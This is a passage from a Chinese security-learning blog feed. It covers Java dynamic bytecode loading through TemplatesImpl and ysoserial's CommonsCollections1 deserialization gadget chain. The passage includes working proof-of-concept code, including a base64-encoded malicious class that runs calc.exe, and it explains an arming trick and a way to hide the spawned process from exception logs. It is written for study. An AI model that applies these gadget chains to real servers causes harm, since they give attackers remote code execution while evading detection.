ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);<span class="comment">//在这里调用了defineClass</span></span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于它是<code>private</code>方法，所以说不能直接调用，再往上走，看看哪个函数调用了<code>defineTransletClasses()</code>方法，它就是<code>getTransletInstance</code>方法，源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();<span class="comment">//此处调用defineTransletClasses方法</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">                NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>也是<code>private</code>方法，得再往上看，找到了<code>newTransformer()</code>方法，这里就是<code>public</code>方法了，可以直接调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//调用了getTransletInstance方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样一条完整的利用链就下来了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>也就是说只要我们执行<code>newTransformer()</code>方法就能触发利用链了</p><p>然后我们还得设置<code>TemplatesImpl</code>对象的三个私有属性，这里我们用反射设置就行，三个属性：<code> _bytecodes</code> 、<code> _name</code> 和 <code>_tfactory</code> ， <code>_bytecodes</code> 是由字节码组成的数组； <code>_name</code> 可以是任意字符串，只要不为 null 即可； <code>_tfactory</code> 需要是一个<code>TransformerFactoryImpl</code> 对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。</p><p>但是，<code>TemplatesImpl</code>中对加载的字节码还有一定的要求，这个字节码对应的类必须要是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类，所以我们还得构造一个特殊的类，用这个类生成字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span></span><br><span class="line"><span class="params"><span class="function">                          SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        String[] command = &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这个类得到字节码之后，我们就来写POC，就新建一个<code>TemplatesImpl</code>对象，把属性设置进去然后执行<code>newTransformer</code>方法触发，主要是咱得先写一个利用反射给私有属性赋值的一个方法<code>setFieldValue</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码如上，执行过后就可成功弹出计算器，这是我们手动执行<code>newTransformer</code>触发的，我们还可以用cc链去触发，下篇文章再讲</p><p><img src="https://s2.loli.net/2022/02/28/mxHZk7ozDtqcKyu.png" alt="image.png"></p><h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><p>这种方法好像还挺重要的，而且生成的<code>bcel</code>字节码也挺奇怪的，这里是通过<code>BCEL</code>提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用<code>javac</code>命令来编译<code>java</code>文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码；有了字节码之后直接用<code>BCEL ClassLoader</code>加载就行了</p><p>这种方法我还没细学，这儿就先不写了</p><p>二月份的最后一篇文章咯，明天就是三月份啦，又是一年春天了，祝大家春天一切顺利！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Java动态加载字节码&quot;&gt;&lt;a href=&quot;#Java动态加载字节码&quot; class=&quot;headerlink&quot; title=&quot;Java动态加载字节码&quot;&gt;&lt;/a&gt;Java动态加载字节码&lt;/h1&gt;&lt;p&gt;接着学Java了，前段时间挖了挖洞，过段时间再来写写经历和体会吧，接下来我们来看看Java中动态加载字节码的方法，可以远程加载服务器上的字节码，或者本地的字节码就行&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之ysoserial中的一些操作</title>
    <link href="https://arsenetang.github.io/2022/02/15/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
    <id>https://arsenetang.github.io/2022/02/15/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/</id>
    <published>2022-02-14T16:00:00.000Z</published>
    <updated>2022-02-14T14:44:37.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ysoserial中的一些操作"><a href="#ysoserial中的一些操作" class="headerlink" title="ysoserial中的一些操作"></a>ysoserial中的一些操作</h1><p>前面我们分析了cc1和cc6，但当我们去看<code>ysoserial</code>中时，会发现它里面有一些其它的操作，这篇文章我们就来看看这些操作的目的以及它所起到的作用</p><span id="more"></span><h2 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h2><p>我们先来看看<code>ysoserial</code>中cc1的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); </span><br><span class="line">        <span class="comment">// arm with actual transformer chain 最后才将真正具有危害的Transformer数组设置进去</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它里面封装了很多方法，很多我们在这里面是看不到的，但原理和前面我们讲的是一样的，但是它刚开始创建的那个<code>Transformer[]</code>是什么呢，里面的<code>new ConstantTransformer(1)</code>好像也没有实质性的意义，而下面那个<code>Transformer[]</code>才是我们真正需要的<code>Transformer[]</code>，那为什么我们前面要放一个假的<code>Transformer[]</code>呢？这是因为我们在使用了<code>Proxy</code>代理了<code>map</code>对象时，我们在任何地方执行<code>map</code>的方法时，都会触发<code>Proxy#invoke</code>，从而执行命令弹出计算器，这就会导致我们在<strong>调试</strong>代码的时候，有时甚至还没有执行到<code>readObject</code>就已经弹出了计算器，这是因为调试器会在下面调用一些<code>toString</code>之类的方法，导致不经意间就触发了命令</p><p>所以说<code>ysoserial</code>对此做出的处理就是最后才会将真正执行命令的<code>Transformer</code>数组设置进<code>transformerChain</code>里面去，而前面的就是假的，避免本地生成序列化流的程序执行到命令，而设置的方法就是利用反射，我们看看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reflections</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">return</span> field;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>ChainedTransformer</code>中存放<code>Transformer</code>数组的变量名就是<code>iTransformers</code>，所以说通过<code>Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</code>就把真正的<code>Transformer</code>数组设置进去了</p><p>而还有一点就是，<code>ysoserial</code>中的<code>Transformed</code>数组最后增加了一个<code>new ConstantTransformer(1)</code>，这是为什么呢？</p><p><img src="https://s2.loli.net/2022/02/14/p7ETcRrI213SB5m.png" alt="image.png"></p><p>其实这一点我也不太清楚，因为我认为无论有没有这个都是不会影响命令的正常执行的，删掉也无伤大雅，但我看p神文章，p神的猜测是可能是为了隐藏异常日志中的一些信息；因为如果这里没有<code>ConstantTransformer(1)</code>，命令进程对象将会被 <code>LazyMap#get</code> 返回，导致我们在异常信息里能看到这个特征，我们先看没有<code>ConstantTransformer(1)</code>的情况：</p><p><img src="https://s2.loli.net/2022/02/14/m71EaBHerNyou39.png" alt="image.png"></p><p>如果我们增加一个 <code>ConstantTransformer(1)</code> 在<code>TransformChain</code>的末尾，异常信息将会变成 java.lang.Integer cannot be cast to java.util.Set ，隐蔽了启动进程的日志特征：</p><p><img src="https://s2.loli.net/2022/02/14/NIGoPfUe91gOB8v.png" alt="image.png"></p><h2 id="cc6"><a href="#cc6" class="headerlink" 